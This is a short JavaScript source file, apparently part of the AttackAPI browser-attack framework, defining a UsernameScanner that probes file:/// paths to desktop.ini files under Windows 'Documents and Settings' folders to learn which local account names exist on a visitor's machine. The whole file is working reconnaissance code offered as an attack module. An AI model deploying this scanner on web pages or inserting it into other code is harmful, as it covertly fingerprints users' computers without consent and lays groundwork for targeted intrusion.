AttackAPI.UsernameScanner = {};
AttackAPI.UsernameScanner.scan = function (callback, usernames) {
	var URLs = [];
	
	for (var index = 0; index < usernames.length; index++) {
		var URL = new String('file:///C:/Documents and Settings/'+ usernames[index] + '/SendTo/desktop.ini');
		URL.username = usernames[index];
		URLs.push(URL);
	}
		
	AttackAPI.URLScanner.scriptScan(function (URL, status) {
		callback(URL.username, status);
	}, URLs);
};
